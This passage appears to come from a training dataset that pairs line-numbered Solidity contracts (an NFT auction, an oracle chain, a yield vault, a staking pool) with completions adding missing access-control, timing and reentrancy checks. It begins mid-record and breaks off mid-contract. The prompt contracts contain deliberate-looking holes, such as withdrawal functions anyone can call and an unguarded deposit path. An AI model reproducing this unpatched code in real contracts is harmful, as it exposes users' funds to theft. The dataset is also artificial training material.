        "completion": "104+ require(auctionStarted, \"Auction has not yet started\");\n104+  require(!auctionEnded, \"Auction has been finished\");\n104+  require(block.timestamp < auctionEndTimestamp, \"Auction has been finished\");\n104+  require(!boughtNow, \"Sorry! Somebody already used BUY NOW button\");\n106    require(msg.value == currentBuyPrice - bids[_msgSender()], \"Invalid funds provided\");\n116+  require(auctionStarted, \"Auction has not yet started\");\n116+  require(!auctionEnded, \"You cannot end the action again\");\n116+  require(block.timestamp >= auctionEndTimestamp, \"Auction duration has not yet elapsed\");       \n127+  require(auctionEnded, \"Please end the auction firstly\");\n140+  require(auctionEnded || block.timestamp > auctionEndTimestamp, \"Cannot withdraw until auction is ended\");\n144+ require(auctionEnded || block.timestamp > auctionEndTimestamp, \"Cannot withdraw until auction is ended\");\n146    require(success, \"Failed to withdraw funds.\");\n150    require(success, \"Failed to withdraw funds.\");\n154    require(success, \"Failed to withdraw funds.\");\n158    require(totalBid > 0, \"Nothing to withdraw\");\n159   require(highestBidder != _msgSender(), \"You cannot withdraw as your bid is the highest bid\");\n161  require(success, \"Failed to withdraw funds.\");\n"
    },
    {
        "prompt": "1 contract FlippazOne is ERC721, ERC721URIStorage, Ownable {\n2     using Counters for Counters.Counter;\n\n3     Counters.Counter private _tokenIdCounter;\n\n4     string  public              baseURI;\n5     address public              proxyRegistryAddress;\n\n6     uint256 public constant     MAX_SUPPLY           = 1;\n7     uint256 public              minBidStep           = 0.25 ether;\n\n8     uint256 public constant     buyNowPrice          = 15 ether;\n9     uint256 public constant     buyNowPriceUntilBid  = 14.75 ether;\n10     uint256 public              buyNowMultiplier     = 20; // 20 = x2\n11     bool    public              boughtNow;\n\n12     uint256 public              auctionDuration      = 24 hours;\n13     bool    public              auctionStarted;\n14     uint256 public              auctionStartTimestamp;\n15     bool    public              auctionEnded;\n16     uint256 public              auctionEndTimestamp;\n\n17     uint256 public              highestBid          = 0.9 ether;\n18     address public              highestBidder;\n19     uint256 public              totalSupply         = 0;\n    \n20     mapping(address => uint) public bids;\n21     mapping(address => bool) public projectProxy;\n\n22     mapping(address => bool) public hasAddressBidded;\n23     address[] bidAdresses;\n24     uint256 totalBidAddresses;\n    \n\n25     constructor() ERC721(\"FlippazOne\", \"FlippazOne\") {\n26         proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;\n27         baseURI = \"ipfs://QmcrAKPLLZhLWDFA6wpiH9QGEz3wsmedZ4TYWM3vGyLPaX\";\n28     }\n\n29     function _baseURI() internal view override returns (string memory) {\n30         return baseURI;\n31     }\n\n32     function editBaseUri(string memory newUri) public onlyOwner{\n33         baseURI = newUri;\n34     }\n    \n35     /* Edit admin functions */\n36     function editBuyNowMultipler(uint256 newMultiplier) public onlyOwner{\n37         buyNowMultiplier = newMultiplier;\n38     }\n\n39     function editMinBidStep(uint256 newMinBidStep) public onlyOwner{\n40         minBidStep = newMinBidStep;\n41     }\n\n42     /// @param newDuration New auction duration in SECONDS\n43     function editDuration(uint256 newDuration) public onlyOwner{\n44         require(auctionStarted, \"Auction has not yet been started\");\n45         auctionEndTimestamp = auctionStartTimestamp + newDuration;\n46         auctionDuration = newDuration;\n47     }\n\n48     function isAuctionActive() public view returns(bool){\n49         if (auctionStarted){\n50             if (!auctionEnded){\n51                 return block.timestamp < auctionEndTimestamp;\n52             }\n53         }\n54         return false;\n55     }\n\n56     function startAuction() public onlyOwner{\n57         require(auctionStarted == false, \"Auction is already started\");\n58         auctionStarted = true;\n59         auctionStartTimestamp = block.timestamp;\n60         auctionEndTimestamp = block.timestamp + auctionDuration;\n61     }\n\n62     function getBidderPaidAmount(address bidder) public view returns(uint256){\n63         return bids[bidder];\n64     }\n\n65     function getBidderByIndex(uint256 bidderIndex) public view returns(address){\n66         return bidAdresses[bidderIndex];\n67     }\n\n    \n68     function bid() public payable {\n69         require(auctionStarted, \"Auction has not yet started\");\n70         require(!auctionEnded, \"Auction has been finished\");\n71         require(!boughtNow, \"Auction has been finished\");\n72         require(block.timestamp < auctionEndTimestamp, \"Auction has been finished\");\n\n73         uint256 newBid = bids[_msgSender()] + msg.value;\n74         require(newBid >= highestBid + minBidStep, \"Bid must be at least 0.25 ETH higher than the highest bid\");\n\n75         bids[_msgSender()] += msg.value;\n76         highestBid = newBid;\n77         highestBidder = _msgSender();\n\n78         if (!hasAddressBidded[_msgSender()]){\n79             hasAddressBidded[_msgSender()] = true;\n80             totalBidAddresses++;\n81             bidAdresses.push(_msgSender());\n82         }\n    \n83     }\n\n84     function isBuyNowActive() public view returns(bool){\n85         if (auctionStarted){\n86             if (!auctionEnded){\n87                 if (!boughtNow){\n88                     if (block.timestamp < auctionEndTimestamp){\n89                             return true;\n90                     }\n91                 }\n92             }\n93         }\n94         return false;\n95     }\n\n96     function getBuyNowPrice() public view returns(uint256){\n97         if (highestBid < buyNowPriceUntilBid){\n98             return buyNowPrice;\n99         } else {\n100             uint256 newBuyNowPrice = highestBid * buyNowMultiplier / 10;\n101             return newBuyNowPrice;\n102         }\n103     }\n\n104     function buyNow() public payable {\n105         uint256 currentBuyPrice = getBuyNowPrice();\n106         require(msg.value == currentBuyPrice - bids[_msgSender()], \"Invalid funds provided\");\n        \n107         highestBid = currentBuyPrice;\n108         highestBidder = _msgSender();\n\n109         uint256 tokenId = _tokenIdCounter.current();\n110         _tokenIdCounter.increment();\n111         _mint(_msgSender(), tokenId);\n112         boughtNow = true;\n113         auctionEnded =  true;\n114         totalSupply = 1;\n115     }\n\n116     function endAuction() public {\n     \n117         uint256 tokenId = _tokenIdCounter.current();\n118         _tokenIdCounter.increment();\n        \n119         if (highestBidder != address(0)){\n120             _safeMint(highestBidder, tokenId);\n121         } else {\n122             _safeMint(owner(), tokenId);\n123         }\n124         totalSupply = 1;\n125         auctionEnded = true;\n126     }\n\n127     function refundBids() public {\n128         for (uint256 i = 0; i < totalBidAddresses; i++){\n129             uint256 addressTotalBid = bids[bidAdresses[i]];\n130             if ((addressTotalBid > 0) && (bidAdresses[i] != highestBidder)){\n131                 (bool success, ) = bidAdresses[i].call{value: addressTotalBid}(\"\");\n132                 bids[bidAdresses[i]] = 0;\n133             }\n134         }\n135     }\n\n136     function burn(uint256 tokenId) public { \n137         require(_isApprovedOrOwner(_msgSender(), tokenId), \"Not approved to burn.\");\n138         _burn(tokenId);\n139     }\n\n140     function ownerWithdraw() public  {       \n141         (bool success, ) = owner().call{value: highestBid}(\"\");\n142         require(success, \"Failed to withdraw funds.\");\n143     }\n\n144     function ownerWithdrawTo(address toAddress) public  {       \n145         (bool success, ) = toAddress.call{value: highestBid}(\"\");\n146         require(success, \"Failed to withdraw funds.\");\n147     }\n\n148     function ownerWithdrawAll() public  {\n149         (bool success, ) = owner().call{value: address(this).balance}(\"\");\n150         require(success, \"Failed to withdraw funds.\");\n151     }\n\n152     function ownerWithdrawAllTo(address toAddress) public {\n153         (bool success, ) = toAddress.call{value: address(this).balance}(\"\");\n154         require(success, \"Failed to withdraw funds.\");\n155     }\n\n156     function bidderWithdraw() public  {\n157         uint256 totalBid = getBidderPaidAmount(_msgSender());\n158         require(totalBid > 0, \"Nothing to withdraw\");\n159         require(highestBidder != _msgSender(), \"You cannot withdraw as your bid is the highest bid\");\n160         (bool success, ) = _msgSender().call{value: totalBid}(\"\");\n161         require(success, \"Failed to withdraw funds.\");\n162         bids[_msgSender()] = 0;\n163     }\n\n164     function _burn(uint256 tokenId) internal override(ERC721, ERC721URIStorage) {\n165         super._burn(tokenId);\n166     }\n\n167     function tokenURI(uint256 tokenId)\n168         public\n169         view\n170         override(ERC721, ERC721URIStorage)\n171         returns (string memory)\n172     {\n173         require(_exists(tokenId), \"Token does not exist\");\n174         return _baseURI();\n175     }\n\n176     function isApprovedForAll(address _owner, address operator) public view override(ERC721) returns (bool) {\n177         OpenSeaProxyRegistry proxyRegistry = OpenSeaProxyRegistry(proxyRegistryAddress);\n178         if (address(proxyRegistry.proxies(_owner)) == operator || projectProxy[operator]) return true;\n179         return super.isApprovedForAll(_owner, operator);\n180     }\n181 }",
        "completion": "104+ require(auctionStarted, \"Auction has not yet started\");\n104+  require(!auctionEnded, \"Auction has been finished\");\n104+  require(block.timestamp < auctionEndTimestamp, \"Auction has been finished\");\n104+  require(!boughtNow, \"Sorry! Somebody already used BUY NOW button\");\n106    require(msg.value == currentBuyPrice - bids[_msgSender()], \"Invalid funds provided\");\n116+  require(auctionStarted, \"Auction has not yet started\");\n116+  require(!auctionEnded, \"You cannot end the action again\");\n116+  require(block.timestamp >= auctionEndTimestamp, \"Auction duration has not yet elapsed\");       \n127+  require(auctionEnded, \"Please end the auction firstly\");\n140+  require(auctionEnded || block.timestamp > auctionEndTimestamp, \"Cannot withdraw until auction is ended\");\n144+ require(auctionEnded || block.timestamp > auctionEndTimestamp, \"Cannot withdraw until auction is ended\");\n146    require(success, \"Failed to withdraw funds.\");\n150    require(success, \"Failed to withdraw funds.\");\n152    onlyOwner \n154    require(success, \"Failed to withdraw funds.\");\n158    require(totalBid > 0, \"Nothing to withdraw\");\n159   require(highestBidder != _msgSender(), \"You cannot withdraw as your bid is the highest bid\");\n161  require(success, \"Failed to withdraw funds.\");\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 pragma solidity ^0.6.8;\n3 pragma experimental ABIEncoderV2;\n\n4 import \"./openzeppelin/contracts/access/Ownable.sol\";\n5 import \"./umb-network/toolbox/dist/contracts/lib/ValueDecoder.sol\";\n\n6 import \"./interfaces/IStakingBank.sol\";\n\n7 import \"./BaseChain.sol\";\n\n8 contract Chain is BaseChain {\n9   IStakingBank public immutable stakingBank;\n\n10   // ========== EVENTS ========== //\n\n11   event LogMint(address indexed minter, uint256 blockId, uint256 staked, uint256 power);\n12   event LogVoter(uint256 indexed blockId, address indexed voter, uint256 vote);\n\n13   // ========== CONSTRUCTOR ========== //\n\n14   constructor(\n15     address _contractRegistry,\n16     uint16 _padding,\n17     uint16 _requiredSignatures\n18   ) public BaseChain(_contractRegistry, _padding, _requiredSignatures) {\n19     // we not changing SB address that often, so lets save it once, it will save 10% gas\n20     stakingBank = stakingBankContract();\n21   }\n\n22   // ========== VIEWS ========== //\n\n23   function isForeign() override external pure returns (bool) {\n24     return false;\n25   }\n\n26   function getName() override external pure returns (bytes32) {\n27     return \"Chain\";\n28   }\n\n29   function getStatus() external view returns(\n30     uint256 blockNumber,\n31     uint16 timePadding,\n32     uint32 lastDataTimestamp,\n33     uint32 lastBlockId,\n34     address nextLeader,\n35     uint32 nextBlockId,\n36     address[] memory validators,\n37     uint256[] memory powers,\n38     string[] memory locations,\n39     uint256 staked,\n40     uint16 minSignatures\n41   ) {\n42     blockNumber = block.number;\n43     timePadding = padding;\n44     lastBlockId = getLatestBlockId();\n45     lastDataTimestamp = squashedRoots[lastBlockId].extractTimestamp();\n46     minSignatures = requiredSignatures;\n\n47     staked = stakingBank.totalSupply();\n48     uint256 numberOfValidators = stakingBank.getNumberOfValidators();\n49     powers = new uint256[](numberOfValidators);\n50     validators = new address[](numberOfValidators);\n51     locations = new string[](numberOfValidators);\n\n52     for (uint256 i = 0; i < numberOfValidators; i++) {\n53       validators[i] = stakingBank.addresses(i);\n54       (, locations[i]) = stakingBank.validators(validators[i]);\n55       powers[i] = stakingBank.balanceOf(validators[i]);\n56     }\n\n57     nextBlockId = getBlockIdAtTimestamp(block.timestamp + 1);\n\n58     nextLeader = numberOfValidators > 0\n59       ? validators[getLeaderIndex(numberOfValidators, block.timestamp + 1)]\n60       : address(0);\n61   }\n\n62   function getNextLeaderAddress() external view returns (address) {\n63     return getLeaderAddressAtTime(block.timestamp + 1);\n64   }\n\n65   function getLeaderAddress() external view returns (address) {\n66     return getLeaderAddressAtTime(block.timestamp);\n67   }\n\n68   // ========== MUTATIVE FUNCTIONS ========== //\n\n69   // solhint-disable-next-line function-max-lines\n70   function submit(\n71     uint32 _dataTimestamp,\n72     bytes32 _root,\n73     bytes32[] memory _keys,\n74     uint256[] memory _values,\n75     uint8[] memory _v,\n76     bytes32[] memory _r,\n77     bytes32[] memory _s\n78   ) public { // it could be external, but for external we got stack too deep\n79     uint32 lastBlockId = getLatestBlockId();\n80     uint32 dataTimestamp = squashedRoots[lastBlockId].extractTimestamp();\n\n81     require(dataTimestamp + padding < block.timestamp, \"do not spam\");\n82     require(dataTimestamp < _dataTimestamp, \"can NOT submit older data\");\n83     // we can't expect minter will have exactly the same timestamp\n84     // but for sure we can demand not to be off by a lot, that's why +3sec\n85     // temporary remove this condition, because recently on ropsten we see cases when minter/node\n86     // can be even 100sec behind\n87     // require(_dataTimestamp <= block.timestamp + 3,\n88     //   string(abi.encodePacked(\"oh, so you can predict the future:\", _dataTimestamp - block.timestamp + 48)));\n89     require(_keys.length == _values.length, \"numbers of keys and values not the same\");\n\n90     bytes memory testimony = abi.encodePacked(_dataTimestamp, _root);\n\n91     for (uint256 i = 0; i < _keys.length; i++) {\n92       require(uint224(_values[i]) == _values[i], \"FCD overflow\");\n93       fcds[_keys[i]] = FirstClassData(uint224(_values[i]), _dataTimestamp);\n94       testimony = abi.encodePacked(testimony, _keys[i], _values[i]);\n95     }\n\n96     bytes32 affidavit = keccak256(testimony);\n97     uint256 power = 0;\n\n98     uint256 staked = stakingBank.totalSupply();\n99     address prevSigner = address(0x0);\n\n100     uint256 i = 0;\n\n101     for (; i < _v.length; i++) {\n102       address signer = recoverSigner(affidavit, _v[i], _r[i], _s[i]);\n103       uint256 balance = stakingBank.balanceOf(signer);\n\n104       require(prevSigner < signer, \"validator included more than once\");\n105       prevSigner = signer;\n106       if (balance == 0) continue;\n\n107       emit LogVoter(lastBlockId + 1, signer, balance);\n108       power += balance; // no need for safe math, if we overflow then we will not have enough power\n109     }\n\n110     require(i >= requiredSignatures, \"not enough signatures\");\n111     // we turn on power once we have proper DPoS\n112     // require(power * 100 / staked >= 66, \"not enough power was gathered\");\n\n113     squashedRoots[lastBlockId + 1] = _root.makeSquashedRoot(_dataTimestamp);\n114     blocksCount++;\n\n115     emit LogMint(msg.sender, lastBlockId + 1, staked, power);\n116   }\n\n117   function getLeaderIndex(uint256 _numberOfValidators, uint256 _timestamp) public view returns (uint256) {\n118     uint32 latestBlockId = getLatestBlockId();\n\n119     // timePadding + 1 => because padding is a space between blocks, so next round starts on first block after padding\n120     uint256 validatorIndex = latestBlockId +\n121       (_timestamp - squashedRoots[latestBlockId].extractTimestamp()) / (padding + 1);\n\n122     return uint16(validatorIndex % _numberOfValidators);\n123   }\n\n124   // @todo - properly handled non-enabled validators, newly added validators, and validators with low stake\n125   function getLeaderAddressAtTime(uint256 _timestamp) public view returns (address) {\n126     uint256 numberOfValidators = stakingBank.getNumberOfValidators();\n\n127     if (numberOfValidators == 0) {\n128       return address(0x0);\n129     }\n\n130     uint256 validatorIndex = getLeaderIndex(numberOfValidators, _timestamp);\n\n131     return stakingBank.addresses(validatorIndex);\n132   }\n133 }",
        "completion": "21+   modifier onlyOwner() {\n        require(msg.sender == owner, \"Not owner\");\n        _;\n    }\n78 onlyOwner\n81     require(dataTimestamp + padding < block.timestamp, \"do not spam\");\n82     require(dataTimestamp < _dataTimestamp, \"can NOT submit older data\");\n89     require(_keys.length == _values.length, \"numbers of keys and values not the same\");\n92       require(uint224(_values[i]) == _values[i], \"FCD overflow\");\n104       require(prevSigner < signer, \"validator included more than once\");\n110     require(i >= requiredSignatures, \"not enough signatures\");\n"
    },
    {
        "prompt": "1 /**\n2  *Submitted for verification at FtmScan.com on 2021-08-31\n3 */\n\n4 // SPDX-License-Identifier: MIT\n5 // File: @openzeppelin/contracts/GSN/Context.sol\n\n\n6 pragma solidity ^0.6.0;\n\n7 /**\n8  * @dev Implementation of a vault to deposit funds for yield optimizing.\n9  * This is the contract that receives funds and that users interface with.\n10  * The yield optimizing strategy itself is implemented in a separate 'Strategy.sol' contract.\n11  */\n12 contract GrimBoostVault is ERC20, Ownable, ReentrancyGuard {\n13     using SafeERC20 for IERC20;\n14     using SafeMath for uint256;\n\n15     struct StratCandidate {\n16         address implementation;\n17         uint proposedTime;\n18     }\n\n19     // The last proposed strategy to switch to.\n20     StratCandidate public stratCandidate;\n21     // The strategy currently in use by the vault.\n22     IStrategy public strategy;\n23     // The minimum time it has to pass before a strat candidate can be approved.\n24     uint256 public immutable approvalDelay;\n\n25     event NewStratCandidate(address implementation);\n26     event UpgradeStrat(address implementation);\n\n27     /**\n28      * @dev Sets the value of {token} to the token that the vault will\n29      * hold as underlying value. It initializes the vault's own 'moo' token.\n30      * This token is minted when someone does a deposit. It is burned in order\n31      * to withdraw the corresponding portion of the underlying assets.\n32      * @param _strategy the address of the strategy.\n33      * @param _name the name of the vault token.\n34      * @param _symbol the symbol of the vault token.\n35      * @param _approvalDelay the delay before a new strat can be approved.\n36      */\n37     constructor (\n38         IStrategy _strategy,\n39         string memory _name,\n40         string memory _symbol,\n41         uint256 _approvalDelay\n42     ) public ERC20(\n43         _name,\n44         _symbol\n45     ) {\n46         strategy = _strategy;\n47         approvalDelay = _approvalDelay;\n48     }\n\n49     function want() public view returns (IERC20) {\n50         return IERC20(strategy.want());\n51     }\n\n52     /**\n53      * @dev It calculates the total underlying value of {token} held by the system.\n54      * It takes into account the vault contract balance, the strategy contract balance\n55      *  and the balance deployed in other contracts as part of the strategy.\n56      */\n57     function balance() public view returns (uint) {\n58         return want().balanceOf(address(this)).add(IStrategy(strategy).balanceOfPool());\n59     }\n\n60     /**\n61      * @dev Custom logic in here for how much the vault allows to be borrowed.\n62      * We return 100% of tokens for now. Under certain conditions we might\n63      * want to keep some of the system funds at hand in the vault, instead\n64      * of putting them to work.\n65      */\n66     function available() public view returns (uint256) {\n67         return want().balanceOf(address(this));\n68     }\n\n69     /**\n70      * @dev Function for various UIs to display the current value of one of our yield tokens.\n71      * Returns an uint256 with 18 decimals of how much underlying asset one vault share represents.\n72      */\n73     function getPricePerFullShare() public view returns (uint256) {\n74         return totalSupply() == 0 ? 1e18 : balance().mul(1e18).div(totalSupply());\n75     }\n\n76     /**\n77      * @dev A helper function to call deposit() with all the sender's funds.\n78      */\n79     function depositAll() external {\n80         deposit(want().balanceOf(msg.sender));\n81     }\n\n82     /**\n83      * @dev The entrypoint of funds into the system. People deposit with this function\n84      * into the vault. The vault is then in charge of sending funds into the strategy.\n85      */\n86     function deposit(uint _amount) public nonReentrant {\n87         require(_amount > 0, \"!deposit zero\");\n\n88         uint256 _pool = balance();\n89         want().safeTransferFrom(msg.sender, address(this), _amount);\n90         earn();\n91         uint256 _after = balance();\n92         _amount = _after.sub(_pool); // Additional check for deflationary tokens\n93         uint256 shares = 0;\n94         if (totalSupply() == 0) {\n95             shares = _amount;\n96         } else {\n97             shares = (_amount.mul(totalSupply())).div(_pool);\n98         }\n99         _mint(msg.sender, shares);\n100     }\n\n101     /**\n102      * @dev Function to send funds into the strategy and put them to work. It's primarily called\n103      * by the vault's deposit() function.\n104      */\n105     function earn() public {\n106         uint _bal = available();\n107         IERC20(want()).safeTransfer(address(strategy), _bal);\n108         IStrategy(strategy).deposit();\n109     }\n\n110     /**\n111      * @dev A helper function to call withdraw() with all the sender's funds.\n112      */\n113     function withdrawAll() external {\n114         withdraw(balanceOf(msg.sender));\n115     }\n\n116     /**\n117      * @dev Function to exit the system. The vault will withdraw the required tokens\n118      * from the strategy and pay up the token holder. A proportional number of IOU\n119      * tokens are burned in the process.\n120      */\n121     function withdraw(uint256 _shares) public {\n122         uint256 r = (balance().mul(_shares)).div(totalSupply());\n123         _burn(msg.sender, _shares);\n\n124         uint b = want().balanceOf(address(this));\n125         if (b < r) {\n126             uint _withdraw = r.sub(b);\n127             strategy.withdraw(_withdraw);\n128             uint _after = want().balanceOf(address(this));\n129             uint _diff = _after.sub(b);\n130             if (_diff < _withdraw) {\n131                 r = b.add(_diff);\n132             }\n133         }\n\n134         want().safeTransfer(msg.sender, r);\n135     }\n\n136     /** \n137      * @dev Sets the candidate for the new strat to use with this vault.\n138      * @param _implementation The address of the candidate strategy.  \n139      */\n140     function proposeStrat(address _implementation) public onlyOwner {\n141         require(address(this) == IStrategy(_implementation).vault(), \"Proposal not valid for this Vault\");\n142         stratCandidate = StratCandidate({\n143             implementation: _implementation,\n144             proposedTime: block.timestamp\n145          });\n\n146         emit NewStratCandidate(_implementation);\n147     }\n\n148     /** \n149      * @dev It switches the active strat for the strat candidate. After upgrading, the \n150      * candidate implementation is set to the 0x00 address, and proposedTime to a time \n151      * happening in +100 years for safety. \n152      */\n\n153     function upgradeStrat() public onlyOwner {\n154         require(stratCandidate.implementation != address(0), \"There is no candidate\");\n155         require(stratCandidate.proposedTime.add(approvalDelay) < block.timestamp, \"Delay has not passed\");\n\n156         emit UpgradeStrat(stratCandidate.implementation);\n\n157         strategy.retireStrat();\n158         strategy = IStrategy(stratCandidate.implementation);\n159         stratCandidate.implementation = address(0);\n160         stratCandidate.proposedTime = 5000000000;\n\n161         earn();\n162     }\n\n163     /**\n164      * @dev Rescues random funds stuck that the strat can't handle.\n165      * @param _token address of the token to rescue.\n166      */\n167     function inCaseTokensGetStuck(address _token) external onlyOwner {\n168         require(_token != address(want()), \"!token\");\n\n169         uint256 amount = IERC20(_token).balanceOf(address(this));\n170         IERC20(_token).safeTransfer(msg.sender, amount);\n171     }\n\n172     function depositFor(address token, uint _amount,address user ) public {\n\n173         uint256 _pool = balance();\n174         IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);\n175         earn();\n176         uint256 _after = balance();\n177         _amount = _after.sub(_pool); // Additional check for deflationary tokens\n178         uint256 shares = 0;\n179         if (totalSupply() == 0) {\n180             shares = _amount;\n181         } else {\n182             shares = (_amount.mul(totalSupply())).div(_pool);\n183         }\n184         _mint(user, shares);\n185     }\n186 }",
        "completion": "48+ modifier nonReentrant() {\n    _guardCounter += 1;\n    uint256 localCounter = _guardCounter;\n    _;\n    require(localCounter == _guardCounter);\n}\n87         require(_amount > 0, \"!deposit zero\");\n141         require(address(this) == IStrategy(_implementation).vault(), \"Proposal not valid for this Vault\");\n154         require(stratCandidate.implementation != address(0), \"There is no candidate\");\n155         require(stratCandidate.proposedTime.add(approvalDelay) < block.timestamp, \"Delay has not passed\");\n168         require(_token != address(want()), \"!token\");\n172 nonReentrant"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n\n2 pragma solidity 0.8.12;\n\n3 import \"@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\n4 import \"./interfaces/IWETH.sol\";\n5 import \"./interfaces/IGymMLM.sol\";\n6 import \"./interfaces/IPancakeRouter02.sol\";\n7 import \"./interfaces/IERC20Burnable.sol\";\n8 import \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\n9 import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\n10 import \"./interfaces/IPancakePair.sol\";\n11 import \"./interfaces/IPancakeFactory.sol\";\n12 import \"@quant-finance/solidity-datetime/contracts/DateTime.sol\";\n13 import \"./interfaces/IGymLevelPool.sol\";\n14 import \"./interfaces/IGymSinglePool.sol\";\n15 /* preserved Line */\n16 /* preserved Line */\n17 /* preserved Line */\n18 /* preserved Line */\n19 /* preserved Line */\n\n20 /**\n21  * @notice GymSinglePool contract:\n22  * - Users can:\n23  *   # Deposit GYMNET\n24  *   # Withdraw assets\n25  */\n\n26 contract GymSinglePool is ReentrancyGuardUpgradeable, OwnableUpgradeable {\n27     using SafeERC20Upgradeable for IERC20Upgradeable;\n\n28    /**\n29      * @notice Info of each user\n30      * One Address can have many Deposits with different periods. Unlimited Amount.\n31      * Total Depsit Tokens = Total amount of user active stake in all.\n32      * Total Depsit Dollar Value = Total Dollar Value over all staking single pools. Calculated when user deposits tokens, and dollar value is for that exact moment rate.\n33      * level = level qualification for this pool. Used internally, for global qualification please check MLM Contract.\n34      * depositId = incremental ID of deposits, eg. if user has 3 stakings then this value will be 2;\n35      * totalClaimt = Total amount of tokens user claimt. \n36      */\n37     struct UserInfo {\n38         uint256 totalDepositTokens;\n39         uint256 totalDepositDollarValue;\n40         uint256 level;\n41         uint256 depositId;\n42         uint256 totalClaimt;\n43     }\n\n44    /** \n45      * @notice Info for each staking by ID\n46      * One Address can have many Deposits with different periods. Unlimited Amount.\n47      * depositTokens = amount of tokens for exact deposit.\n48      * depositDollarValue = Dollar value of deposit.\n49      * stakePeriod = Locking Period - from 3 months to 30 months. value is integer\n50      * depositTimestamp = timestamp of deposit\n51      * withdrawalTimestamp = Timestamp when user can withdraw his locked tokens\n52      * rewardsGained = amount of rewards user has gained during the process\n53      * is_finished = checks if user has already withdrawn tokens\n54      */\n55     struct UserDeposits {\n56         uint256 depositTokens;\n57         uint256 depositDollarValue;\n58         uint256 stakePeriod;\n59         uint256 depositTimestamp;\n60         uint256 withdrawalTimestamp;\n61         uint256 rewardsGained;\n62         uint256 rewardsClaimt;\n63         uint256 rewardDebt;\n64         bool is_finished;\n65     }\n66     /**\n67      * @notice Info of Pool\n68      * @param lastRewardBlock: Last block number that reward distribution occurs\n69      * @param accUTacoPerShare: Accumulated rewardPool per share, times 1e18\n70      * @param rewardPerBlock: How many reward tokens will user get per block\n71      */\n72     struct PoolInfo {\n73         uint256 lastRewardBlock;\n74         uint256 accRewardPerShare;\n75         uint256 rewardPerBlock;\n76     }\n\n77     /// Startblock number\n78     uint256 public startBlock;\n79     uint256 public withdrawFee;\n\n80      // MLM Contract - RelationShip address\n81     address public relationship;\n82     /// Treasury address where will be sent all unused assets\n83     address public treasuryAddress;\n84     /// Info of pool.\n85     PoolInfo public poolInfo;\n86     /// Info of each user that staked tokens.\n87     mapping(address => UserInfo) public userInfo;\n\n88     /// accepts user address and id of element to select - returns information about selected staking by id\n89     mapping (address=>UserDeposits[]) public user_deposits;\n\n90     uint256 private lastChangeBlock;\n\n91     /// GYMNET token contract address\n92     address public tokenAddress;\n\n93     /// address of pancake Router\n94     address public pancakeRouterAddress;\n95     /// WBNB and BUSD Token Pair address, element 0 = Address of WBNB Token, element 1= Address of GYMNET \n96     address[] public wbnbAndUSDTTokenArray;\n97     /// GYMNET and WBNB Token Pair address, element 0 = Address of GYMNET, element 1 = Address of WBNB Token, \n98     address[] public GymWBNBPair;\n\n99     /// Level Qualifications for the pool\n100     uint256[16] public levels;\n101     /// Locking Periods \n102     uint256[6] public months;\n\n103     /// Amount of Total GYMNET Locked in the pool\n104     uint256 public totalGymnetLocked;\n\n105     /// Amount of GYMNET all users has claimt over time.\n106     uint256 public totalClaimtInPool;\n\n107     /// Percent that will be sent to MLM Contract for comission distribution\n108     uint256 public RELATIONSHIP_REWARD;\n\n109     /// 6% comissions\n110     uint256 public poolRewardsAmount;\n\n111     address public holderRewardContractAddress;\n\n112     address public runnerScriptAddress;\n113     uint256 public totalBurntInSinglePool;\n114     bool public isPoolActive;\n115     bool public isInMigrationToVTwo;\n116     uint256 public totalGymnetUnlocked;\n117     uint256 public unlockedTimestampQualification;\n118     address public vaultContractAddress;\n119     address public farmingContractAddress;\n\n120     address public levelPoolContractAddress;\n121     address public newSinglePoolAddress;\n\n122     /* ========== EVENTS ========== */\n\n123     event Initialized(address indexed executor, uint256 at);\n124     event Deposit(address indexed user, uint256 amount,uint indexed period);\n125     event Withdraw(address indexed user, uint256 amount,uint indexed period);\n126     event RewardPaid(address indexed token, address indexed user, uint256 amount);\n127     event ClaimUserReward(address indexed user, uint256 amount);\n\n\n128     modifier onlyRunnerScript() {\n129         require(msg.sender == runnerScriptAddress || msg.sender == owner(), \"Only Runner Script\");\n130         _;\n131     }\n132     modifier onlyBank() {\n133         require(msg.sender == vaultContractAddress, \"GymFarming:: Only bank\");\n134         _;\n135     }\n136     receive() external payable {}\n\n137     fallback() external payable {}\n\n138 // all initialize parameters are mandatory\n139     function initialize(\n140         uint256 _startBlock,\n141         address _gym,\n142         address _mlm,\n143         uint256 _gymRewardRate,\n144         address _pancakeRouterAddress,\n145         address[] memory _wbnbAndUSDTTokenArray,\n146         address[] memory _GymWBNBPair\n147     ) external initializer {\n148         require(block.number < _startBlock, \"SinglePool: Start block must have a bigger value\");\n\n149         startBlock = _startBlock; // Number of Upcoming Block\n150         relationship = _mlm;  // address of MLM contract\n151         tokenAddress = _gym; // address of GYMNET Contract\n152         pancakeRouterAddress = _pancakeRouterAddress; // Address of Pancake Router\n153         wbnbAndUSDTTokenArray = _wbnbAndUSDTTokenArray; // WBNB And USDT Token Addresses [WBNB,USDT]\n154         GymWBNBPair = _GymWBNBPair; // GYMNET And WBNB Token Addresses [GYMNET,WBNB]\n155         runnerScriptAddress = msg.sender;\n156         isPoolActive = false;\n157         isInMigrationToVTwo = false;\n158         RELATIONSHIP_REWARD = 39; // Relationship commission amount\n159         levels = [0, 0, 200, 200, 2000, 4000, 10000, 20000, 40000, 45000, 50000, 60000, 65000, 70000, 75000, 80000]; // Internal Pool Levels\n160         months = [3, 6, 12, 18, 24, 30]; // Locking Periods\n\n161         poolInfo = PoolInfo({\n162                 lastRewardBlock: _startBlock,\n163                 rewardPerBlock: _gymRewardRate,\n164                 accRewardPerShare: 0\n165             });\n\n166         lastChangeBlock = _startBlock;\n\n167         __Ownable_init();\n168         __ReentrancyGuard_init();\n        \n169         emit Initialized(msg.sender, block.number);\n170     }\n\n\n171     function setPoolInfo(uint256 lastRewardBlock,uint256 accRewardPerShare, uint256 rewardPerBlock) external onlyOwner {\n172         poolInfo = PoolInfo({\n173                 lastRewardBlock: lastRewardBlock,\n174                 accRewardPerShare: accRewardPerShare,\n175                 rewardPerBlock: rewardPerBlock\n176             });\n177     }\n\n178     function updateStartBlock(uint256 _startBlock) external onlyOwner {\n179         startBlock = _startBlock;\n180     }\n\n181     function setMLMAddress(address _relationship) external onlyOwner {\n182         relationship = 